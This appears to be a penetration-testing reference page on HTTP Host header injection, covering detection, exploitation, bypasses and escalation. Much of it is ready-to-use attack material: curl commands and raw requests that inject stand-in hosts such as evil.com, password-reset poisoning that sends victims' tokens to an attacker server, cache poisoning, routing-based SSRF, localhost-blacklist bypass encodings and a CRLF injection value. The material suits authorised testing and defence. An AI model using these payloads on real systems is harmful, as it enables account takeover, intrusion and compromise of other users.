# Host Header Injection

> **Summary**: Manipulate the HTTP Host header (or equivalent override headers) to influence server-side logic that trusts the header value.
> **Impact**: Password reset poisoning, web cache poisoning, routing-based SSRF, access to internal virtual hosts, authentication bypass.
> **Typical Severity**: Medium - High

## Detection

### Indicators
- Application reflects the Host header value in responses (links, redirects, emails)
- Password reset links contain the Host header value as the domain
- Application serves different content based on Host header
- Cache behaves differently when Host header is modified

### Automated Detection
```bash
# headi - automated host header injection testing
# https://github.com/mlcsec/headi
headi -url http://<TARGET>

# Burp Suite - Param Miner extension (guess headers)
# Burp Suite - Active scan for host header issues
```

### Manual Detection
```bash
# Change Host header and observe response
curl -H "Host: evil.com" http://<TARGET>/

# Test override headers
curl -H "X-Forwarded-Host: evil.com" http://<TARGET>/
curl -H "X-Host: evil.com" http://<TARGET>/

# Supply two Host headers
curl -H "Host: <TARGET>" -H "Host: evil.com" http://<TARGET>/

# Absolute URL with different Host
curl --request-target "http://<TARGET>/" -H "Host: evil.com" http://<TARGET>/

# Host with port
curl -H "Host: <TARGET>:evil.com" http://<TARGET>/
curl -H "Host: <TARGET>@evil.com" http://<TARGET>/
```

## Exploitation

### Prerequisites
- Application uses the Host header value in server-side logic (link generation, routing, caching)
- No strict Host header validation or whitelist
- Reverse proxy / load balancer forwards override headers

### Attack Vectors

#### 1. Password Reset Poisoning
An attacker requests a password reset for a known user, intercepts the request, and modifies the Host header. If the application uses the Host value to build the reset URL, the victim receives an email with a link pointing to the attacker's domain.

```
POST /forgot-password HTTP/1.1
Host: <ATTACKER_DOMAIN>
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

If blocked, try override headers:
```
POST /forgot-password HTTP/1.1
Host: <TARGET>
X-Forwarded-Host: <ATTACKER_DOMAIN>
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

**Success criteria**: Victim receives reset email with link pointing to `<ATTACKER_DOMAIN>`. When they click it, the token is sent to the attacker.

#### 2. Web Cache Poisoning via Host Header
```
GET / HTTP/1.1
Host: <ATTACKER_DOMAIN>

# Or with override header (more likely to bypass restrictions)
GET / HTTP/1.1
Host: <TARGET>
X-Forwarded-Host: <ATTACKER_DOMAIN>
```

If the response includes a link/script referencing the injected host and the cache stores it, subsequent users receive the poisoned response.

#### 3. Routing-Based SSRF
Manipulate the Host header to route the request to an internal service:
```
GET /admin HTTP/1.1
Host: 192.168.0.1
```

#### 4. Access Control Bypass
Some applications restrict admin panels to specific hostnames:
```
GET /admin HTTP/1.1
Host: localhost

GET /admin HTTP/1.1
Host: 127.0.0.1
```

#### 5. Virtual Host Enumeration
Fuzz the Host header to discover internal virtual hosts:
```bash
ffuf -u http://<TARGET_IP>/ -w <VHOST_WORDLIST> -H "Host: FUZZ.<TARGET_DOMAIN>" -fs <DEFAULT_SIZE>
gobuster vhost -u http://<TARGET_IP> -w <VHOST_WORDLIST> --domain <TARGET_DOMAIN>
```

### Override Headers to Test
```
X-Forwarded-Host: <ATTACKER_DOMAIN>
X-Host: <ATTACKER_DOMAIN>
X-HTTP-Host-Override: <ATTACKER_DOMAIN>
X-Forwarded-Server: <ATTACKER_DOMAIN>
Forwarded: host=<ATTACKER_DOMAIN>
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

### Proof of Concept
```bash
# Password reset poisoning
curl -X POST http://<TARGET>/forgot-password \
  -H "Host: <TARGET>" \
  -H "X-Forwarded-Host: <ATTACKER_SERVER>" \
  -d "email=victim@example.com"

# Check attacker server logs for token arrival
```

## Bypasses

### Localhost Blacklist Bypass
If `localhost` or `127.0.0.1` is blocked:

| Technique | Value |
|-----------|-------|
| Decimal encoding | `2130706433` |
| Hex encoding | `0x7f000001` |
| Octal encoding | `0177.0000.0000.0001` |
| Zero | `0` |
| Short form | `127.1` |
| IPv6 | `::1`, `0000::1`, `::ffff:127.0.0.1` |
| External resolving domain | `localtest.me`, `spoofed.burpcollaborator.net` |

### Double Host Header
```
Host: <TARGET>
Host: <ATTACKER_DOMAIN>
```
Some servers/proxies use the first, others the second.

### Host Header with Port Injection
```
Host: <TARGET>:@<ATTACKER_DOMAIN>
Host: <TARGET> <ATTACKER_DOMAIN>
Host: <TARGET>%0d%0aX-Injected: header
```

### Absolute URL Override
```
GET http://<TARGET>/ HTTP/1.1
Host: <ATTACKER_DOMAIN>
```
The absolute URL takes precedence in some implementations.

## Escalation
- **Password reset poisoning** --> [Account Takeover](account-takeover.md)
- **Cache poisoning** --> Stored XSS affecting all users via [Cache Poisoning](cache-poisoning.md)
- **Routing-based SSRF** --> Access internal services via [SSRF](ssrf.md)
- **Admin panel access** --> Full application compromise
- **CRLF via Host** --> Header injection, response splitting

## Tools

| Tool | Usage |
|------|-------|
| [headi](https://github.com/mlcsec/headi) | `headi -url http://<TARGET>` |
| Burp Suite (Param Miner) | Automated header guessing and testing |
| ffuf | `ffuf -u http://<IP>/ -H "Host: FUZZ.<DOMAIN>" -w <WORDLIST>` |
| gobuster | `gobuster vhost -u http://<IP> -w <WORDLIST> --domain <DOMAIN>` |
| curl | Manual header injection testing |

## References
- [PortSwigger - HTTP Host Header Attacks](https://portswigger.net/web-security/host-header)
- [PayloadsAllTheThings - Host Header Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Host%20Header%20Injection)
- [OWASP - Host Header Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection)

## See Also
- [Cache Poisoning](cache-poisoning.md)
- [SSRF](ssrf.md)
- [Password Reset Vulnerabilities](reset-password.md)
- [Account Takeover](account-takeover.md)
